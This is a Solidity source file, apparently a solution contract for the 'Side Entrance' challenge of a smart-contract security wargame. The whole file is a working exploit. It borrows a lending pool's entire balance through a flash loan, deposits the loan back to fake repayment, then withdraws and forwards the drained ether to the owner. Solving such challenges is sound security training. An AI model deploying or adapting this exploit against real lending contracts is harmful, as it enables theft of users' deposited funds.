// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttack is IFlashLoanEtherReceiver, Ownable {
  using Address for address payable;

  SideEntranceLenderPool public pool;

  constructor(address _pool) {
    pool = SideEntranceLenderPool(_pool);
  }

  function flashLoan() external onlyOwner {
    pool.flashLoan(address(pool).balance);

    pool.withdraw();
    payable(msg.sender).sendValue(address(this).balance);
  }

  function execute()  external override payable {
    require(msg.sender == address(pool), "caller not the pool");

    pool.deposit{value: msg.value}();
  }

  receive () external payable {}
}
